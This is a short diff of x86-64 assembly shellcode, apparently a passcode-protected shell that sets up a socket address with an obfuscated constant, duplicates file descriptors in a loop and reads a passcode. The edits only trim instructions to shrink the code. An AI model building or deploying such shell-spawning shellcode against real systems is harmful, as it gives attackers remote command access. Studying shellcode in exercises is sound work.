@@ -25,7 +25,6 @@ _start:
         ; bzero(&server.sin_zero, 8)
 
         push rdx ; already zeroed by "cdq" instruction
-
         mov rbx, 0xfeffff80a3eefffd
         not rbx
         push rbx
@@ -52,7 +51,7 @@ dup2cycle:
         loopnz dup2cycle       
         
         ; read passcode
-        xor rax,rax
+        ; xor rax,rax - already zeroed out by prev cycle
         xor rdi,rdi
         push rax
         mov rsi,rsp
